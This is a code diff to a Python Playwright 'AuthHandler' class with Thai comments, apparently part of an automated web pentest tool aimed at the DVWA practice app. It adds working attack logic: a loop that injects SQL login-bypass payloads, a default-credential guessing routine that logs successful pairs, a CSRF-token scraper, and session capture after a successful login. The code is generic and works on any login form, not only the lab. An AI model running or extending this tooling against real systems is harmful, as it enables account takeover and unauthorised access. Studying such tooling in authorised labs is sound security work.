@@ -78,17 +78,20 @@ class AuthHandler:
 
         for payload in payloads:
             try:
-                self.logger.info(f"[Auth] Testing SQLi: {payload}")
-                user_input.fill(payload)
-                pass_input.fill(payload)
+                # DVWA ต้องการ Token ใหม่ทุกครั้งที่โหลดหน้า
+                page.reload(wait_until="networkidle") 
                 
-                with page.expect_navigation(timeout=5000):
-                    submit_btn.click()
+                self.logger.info(f"[Auth] Testing SQLi Bypass: {payload}")
+                user_input.fill(payload)
+                pass_input.fill("anything") # DVWA บางเวอร์ชันต้องการค่าในช่อง pass ด้วย
+                
+                # คลิกปุ่ม Login (DVWA บางทีใช้ input[name="Login"])
+                submit_btn.click()
+                page.wait_for_load_state("networkidle")
 
                 if self._check_success(page):
                     self._capture_session(page)
                     return True
-                page.goto(page.url) # Reset state
             except: continue
         return False
 
@@ -173,3 +176,52 @@ class AuthHandler:
             document.open(); document.write(text); document.close();
         }})();
         """
+    
+    def _try_default_creds(self, page: Page) -> bool:
+        """[FIXED] ลองใช้รหัสผ่านมาตรฐานจาก list ที่เตรียมไว้"""
+        self.logger.info("[Auth] 🔑 Testing common default credentials...")
+        
+        user_selector = 'input[type="text"], input[type="email"], input[name*="user"]'
+        pass_selector = 'input[type="password"]'
+        submit_selector = 'button[type="submit"], input[type="submit"], button:has-text("Login")'
+
+        user_input = page.locator(user_selector).first
+        pass_input = page.locator(pass_selector).first
+        submit_btn = page.locator(submit_selector).first
+
+        if not user_input.is_visible() or not pass_input.is_visible():
+            return False
+
+        for username, password in self.default_creds:
+            try:
+                self.logger.debug(f"[Auth] Trying: {username} / {password}")
+                user_input.fill("") # เคลียร์ค่าเก่า
+                user_input.fill(username)
+                pass_input.fill("")
+                pass_input.fill(password)
+                
+                # คลิกและรอโหลด
+                submit_btn.click()
+                page.wait_for_load_state("networkidle", timeout=3000)
+
+                if self._check_success(page):
+                    self._capture_session(page)
+                    self.logger.info(f"[Auth] ✅ Default Creds Success: {username}:{password}")
+                    return True
+                
+                # ถ้าไม่สำเร็จ ให้กลับไปหน้าเดิมเพื่อลองคู่ถัดไป
+                if "login" not in page.url.lower():
+                    page.go_back()
+            except:
+                continue
+        return False
+
+    def _get_csrf_token(self, page: Page) -> str:
+        """[GENERIC] พยายามหา CSRF Token จากหน้าเว็บ (สำคัญมากสำหรับ DVWA)"""
+        try:
+            # ค้นหาจาก hidden input ที่ชื่อมักจะมีคำว่า token
+            token_element = page.locator('input[type="hidden"][name*="token"], input[type="hidden"][id*="token"]').first
+            if token_element.count() > 0:
+                return token_element.get_attribute("value")
+        except: pass
+        return ""
